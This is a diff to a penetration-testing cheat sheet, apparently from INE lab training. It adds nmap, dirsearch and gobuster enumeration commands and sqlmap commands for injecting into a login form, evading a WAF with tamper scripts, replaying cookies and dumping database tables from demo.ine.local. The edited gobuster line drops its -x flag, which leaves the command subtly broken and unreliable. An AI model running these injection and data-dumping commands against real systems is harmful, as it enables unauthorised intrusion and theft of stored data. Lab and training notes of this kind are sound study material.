@@ -25,6 +25,13 @@ nmap -sT -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
 nmap -sU -n -Pn -p- --min-rate 5000 $target_IP -oN allPorts -oG allPorts
 ```
 
+## When a domain resolves to multiple IP addresses
+
+To scan all the resolved IP addresses use the following option
+```bash
+nmap ...( command)... --resolve-all
+```
+Note the use of the **resolve-all** option.
 
 ### Service fingerprinting and NSE scripts
 
@@ -63,12 +70,12 @@ whatweb $TARGET_URL
 ### dirsearch
 
 ```bash
-dirsearch -u $TARGET -w $WORDLISTS -e zip,txt,xxx,old,bak,sql,php,html,js,json,png,jpg -f
+dirsearch -u $TARGET -w $WORDLISTS -e zip,tar,gz,tgz,rar,java,cs,pdf,docx,rtf,xlsx,pptx,asa,inc,config,txt,xxx,old,bak,sql,php,html,js,json,png,jpg -f
 ```
 
 ### gobuster
 ```bash
-gobuster dir -u $URL -w $WORDLIST -q -o $OUTPUT_FILE -x old,bak,zip,rar,sql,java,php,cs
+gobuster dir -u $URL -w $WORDLIST -q -o $OUTPUT_FILE zip,tar,gz,tgz,rar,java,cs,pdf,docx,rtf,xlsx,pptx,asa,inc,config,txt,xxx,old,bak,sql,php,html,js,json,png,jpg
 ```
 # XSS
 
@@ -151,14 +158,41 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 
 ```
 
+## Attempts to bypass a WAF
 
-# Dump a specific table
+```bash
+sqlmap -u 'http://demo.ine.local/index.php?page=login.php' -p page --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,
+equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,
+unionalltounion,unmagicquotes
+```
+
+Additional parameters can be
+
+```bash
+--code=HTTPCode --no-cast --no-escape
+```
+
+## Setting cookie values
+
+```bash
+sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --threads 10 --cookie="cookie=value"
+```
+
+The cookie parameter can be filled with the HTTP Cookie header value from valid requests.
+
+## Using a saved request
+
+```shell
+sqlmap -r req.txt -p parameter
+```
+
+## Dump a specific table
 
 ```shell
 sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --dump -T table --threads 10
 ```
 
-# Dump a specific table from a database
+## Dump a specific table from a given database
 ```shell
 sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
 ```
